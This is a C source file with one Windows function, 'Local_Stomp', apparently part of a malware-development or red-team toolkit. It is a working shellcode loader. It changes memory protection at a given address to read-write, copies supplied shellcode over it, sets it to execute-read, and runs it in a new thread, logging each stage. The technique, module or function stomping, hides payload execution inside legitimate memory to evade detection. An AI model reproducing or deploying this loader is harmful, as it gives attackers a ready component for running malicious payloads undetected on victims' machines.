#include "stomp.h"


BOOL Local_Stomp
(
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	IN PVOID pAddress
)

{

	DWORD OldProt = NULL;
	HANDLE hThread = NULL;

	if (!VirtualProtect(pAddress, sShellSize, PAGE_READWRITE, &OldProt))
	{
		WARN("VirtualProtect Failed! With an Error: %lu", GetLastError());
		return FALSE;
	}

	INFO("Protection Set ---> [RW]");

	memcpy(pAddress, sShellcode, sShellSize);

	INFO("Copied [%zu] Bytes into Local Process Memory!", sShellSize);

	if (!VirtualProtect(pAddress, sShellSize, PAGE_EXECUTE_READ, &OldProt))
	{
		WARN("VirtualProtect Failed! With an Error: %lu", GetLastError());
		return FALSE;
	}

	INFO("Successfully Changed Protection --- [RW] ---> [RX]");

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (hThread == NULL)
	{
		WARN("CreateThread Failed! With an Error: %lu", GetLastError());
		return FALSE;
	}

	INFO("Successfully Created Local Thread...");
	INFO("Current Address of our thread: [0x%p]", hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}